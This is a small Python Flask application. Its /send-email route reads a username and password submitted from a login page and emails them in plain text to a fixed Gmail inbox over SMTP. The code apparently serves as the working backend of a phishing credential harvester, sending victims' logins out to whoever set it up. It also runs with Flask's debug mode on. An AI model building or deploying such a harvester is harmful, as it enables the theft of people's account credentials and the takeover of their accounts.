from flask import Flask, render_template, request, jsonify
import smtplib

app = Flask(__name__)

@app.route("/")
def home():
    return render_template("index.html")


@app.route("/send-email", methods=["POST"])
def send_email():
    data = request.json

    username = data.get("username")
    password = data.get("password")

    message = f"Username: {username}\nPassword: {password}"

    sender_email = "YOUR_EMAIL@gmail.com"
    receiver_email = "YOUR_EMAIL@gmail.com"
    app_password = "YOUR_APP_PASSWORD"

    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(sender_email, app_password)

            server.sendmail(
                sender_email,
                receiver_email,
                f"Subject: Login Form\n\n{message}"
            )

        return jsonify({"message": "Email sent successfully!"})

    except Exception as e:
        print(e)
        return jsonify({"message": "Failed to send email"}), 500


if __name__ == "__main__":
    app.run(debug=True)
